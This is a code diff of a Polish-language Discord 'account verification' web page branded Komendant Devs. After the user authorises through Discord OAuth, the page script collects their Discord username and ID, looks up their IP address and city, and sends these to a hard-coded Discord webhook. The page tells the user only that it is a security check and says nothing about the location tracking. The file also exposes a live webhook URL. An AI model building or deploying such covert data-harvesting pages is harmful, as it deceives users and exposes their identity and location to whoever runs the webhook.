@@ -8,12 +8,23 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: #0a0a0a; color: #ffffff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .card { background: #111111; border: 1px solid #222222; padding: 50px 30px; border-radius: 24px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.9); }
-        .loader { width: 60px; height: 60px; border: 3px solid #1a1a1a; border-radius: 50%; border-top-color: #5865f2; animation: spin 1s linear infinite; margin: 0 auto 30px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
         h1 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
-        #status-text { color: #888; font-size: 14px; }
-        .success-icon { font-size: 50px; color: #23a559; display: none; margin-bottom: 20px; animation: scaleUp 0.3s ease; }
-        @keyframes scaleUp { from { transform: scale(0); } to { transform: scale(1); } }
+        #status-text { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .btn {
+            background-color: #5865f2;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-block;
+            transition: 0.3s;
+            cursor: pointer;
+            border: none;
+        }
+        .btn:hover { background-color: #4752c4; transform: translateY(-2px); }
+        .loader { width: 50px; height: 50px; border: 3px solid #1a1a1a; border-radius: 50%; border-top-color: #23a559; animation: spin 1s linear infinite; margin: 0 auto 30px; display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .footer { margin-top: 50px; font-size: 10px; color: #333; letter-spacing: 4px; font-weight: 900; text-transform: uppercase; }
     </style>
 </head>
@@ -21,84 +32,83 @@
 
 <div class="card">
     <div id="loader-icon" class="loader"></div>
-    <div id="success-icon" class="success-icon">✓</div>
-    <h1 id="main-title">Weryfikacja...</h1>
-    <p id="status-text">Czekam na autoryzację z Discord...</p>
+    <h1 id="main-title">Weryfikacja Konta</h1>
+    <p id="status-text">Kliknij przycisk poniżej, aby połączyć swoje konto z systemem bezpieczeństwa Komendant Devs.</p>
+    
+    <button id="auth-btn" class="btn" onclick="redirectToDiscord()">Zautoryzuj system</button>
+    
     <div class="footer">Made by Komendant Devs</div>
 </div>
 
 <script>
+    const CLIENT_ID = "1455907268137586719"; // WPISZ TUTAJ ID SWOJEGO BOTA
+    const REDIRECT_URI = window.location.origin + window.location.pathname;
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1474522040085254144/EYnK4I6zerq0M0dZYUaXYQA8_lDJomCRJ3nSXOD5Pp-x9Ea6INZw2Sb4eijahy1ZSRmK";
 
-    async function start() {
-        const status = document.getElementById('status-text');
-        const title = document.getElementById('main-title');
-        const loader = document.getElementById('loader-icon');
-        const success = document.getElementById('success-icon');
+    function redirectToDiscord() {
+        const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
+        window.location.href = url;
+    }
 
-        // Pobieramy token z adresu URL (Discord zwraca go po #access_token=...)
+    async function processVerification() {
         const fragment = new URLSearchParams(window.location.hash.slice(1));
         const accessToken = fragment.get('access_token');
 
-        // BLOKADA: Jeśli nie ma tokenu, nic nie wysyłamy
-        if (!accessToken) {
-            status.innerText = "Błąd: Brak autoryzacji. Użyj przycisku na Discordzie.";
-            loader.style.borderTopColor = "#ff4747";
-            return;
-        }
+        if (!accessToken) return; // Jeśli nie ma tokenu, zostajemy na widoku przycisku
+
+        // Jeśli jest token, chowamy przycisk i pokazujemy ładowanie
+        document.getElementById('auth-btn').style.display = 'none';
+        document.getElementById('loader-icon').style.display = 'block';
+        document.getElementById('main-title').innerText = "Weryfikowanie...";
+        document.getElementById('status-text').innerText = "Pobieranie danych zabezpieczeń...";
 
         try {
-            status.innerText = "Pobieranie danych profilu Discord...";
-
-            // 1. Pobieramy dane użytkownika z Discord API
+            // 1. Pobieranie danych z Discord
             const userRes = await fetch('https://discord.com/api/users/@me', {
                 headers: { Authorization: `Bearer ${accessToken}` }
             });
             const userData = await userRes.json();
 
-            // 2. Pobieramy dane o IP i lokalizacji
-            status.innerText = "Analiza zabezpieczeń sieciowych...";
+            // 2. Pobieranie IP i Lokalizacji
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
             
             const vpnKeywords = ['vpn', 'proxy', 'hosting', 'ovh', 'cloudflare', 'google', 'amazon'];
             const isVPN = vpnKeywords.some(k => ipData.org && ipData.org.toLowerCase().includes(k));
 
-            // 3. Wysyłamy kompletny Webhook
+            // 3. Wysyłka na Webhook
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🛡️ Nowa Weryfikacja Użytkownika",
+                        title: "🛡️ Log Autoryzacji Użytkownika",
                         color: isVPN ? 0xff4747 : 0x23a559,
                         thumbnail: { url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` },
                         fields: [
-                            { name: "👤 Użytkownik", value: `${userData.username} (\`${userData.id}\`)`, inline: false },
+                            { name: "👤 Użytkownik", value: `**${userData.username}** (\`${userData.id}\`)`, inline: false },
                             { name: "🌐 Adres IP", value: `\`${ipData.ip}\``, inline: true },
                             { name: "📍 Lokalizacja", value: `\`${ipData.city}, ${ipData.country_name}\``, inline: true },
                             { name: "🛡️ VPN/Proxy", value: isVPN ? "⚠️ WYKRYTO" : "✅ BRAK", inline: true }
                         ],
-                        footer: { text: "System Komendant Devs Security" },
+                        footer: { text: "Komendant Devs Security" },
                         timestamp: new Date()
                     }]
                 })
             });
 
-            // 4. Sukces na stronie
-            loader.style.display = 'none';
-            success.style.display = 'block';
-            title.innerText = "Zweryfikowano";
-            title.style.color = "#23a559";
-            status.innerText = `Dziękujemy ${userData.username}! Twoje dane zostały zapisane. Możesz wrócić na serwer.`;
+            // 4. Sukces
+            document.getElementById('loader-icon').style.display = 'none';
+            document.getElementById('main-title').innerText = "Zweryfikowano";
+            document.getElementById('main-title').style.color = "#23a559";
+            document.getElementById('status-text').innerText = "Dziękujemy! Możesz teraz zamknąć to okno.";
 
-        } catch (error) {
-            status.innerText = "Wystąpił błąd podczas weryfikacji.";
-            console.error(error);
+        } catch (e) {
+            document.getElementById('status-text').innerText = "Wystąpił błąd. Odśwież stronę.";
         }
     }
 
-    window.onload = start;
+    window.onload = processVerification;
 </script>
 </body>
 </html>
